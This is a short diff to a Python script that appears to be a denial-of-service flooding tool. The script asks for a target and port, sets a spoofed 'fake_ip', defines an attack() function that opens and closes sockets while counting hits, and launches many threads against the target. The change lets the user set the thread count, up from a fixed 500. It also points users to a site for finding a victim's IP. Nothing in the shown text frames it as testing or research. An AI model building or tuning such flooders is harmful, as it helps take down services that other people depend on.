@@ -13,6 +13,7 @@ print("© 2022 Tommaso Bona")
 print("Website IP finder: www.site24x7.com/find-ip-address-of-web-site.html")
 target = str(input("Insert Target: "))
 port = int(input("Insert Port: "))
+Trd = int(input("Insert Threads: "))
 fake_ip = '44.197.175.168'
 attack_num = 0
 def attack():
@@ -27,6 +28,6 @@ def attack():
         print(attack_num)
 
         s.close()
-for i in range(500):
+for i in range(Trd):
     thread = threading.Thread(target = attack)
     thread.start()    
